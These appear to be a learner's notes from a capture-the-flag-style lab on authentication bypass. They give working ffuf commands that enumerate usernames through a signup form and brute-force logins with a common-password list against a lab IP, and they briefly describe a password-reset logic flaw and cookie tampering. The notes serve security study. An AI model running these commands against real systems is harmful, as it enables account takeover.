# Authentication Bypass
* Learning how to bypass authentication

## Username Enumeration
* Can use `ffuf` cmd line tool to construct which usernames already exist
* `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.100.134/customers/signup -mr "username already exists"`
* * https://github.com/ffuf/ffuf downloaded here
 
## Brute Force
* Using the found logins we can try brute force attack
* `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.100.134/customers/login -fc 200`

## Logic Flaw
* Code logic could contain a flaw in the pathways to say reset a password
* Vulernability is we can reset a password for an email and provide the username and our own email

## Cookie Tampering
* Examing and editing cookies might give us something
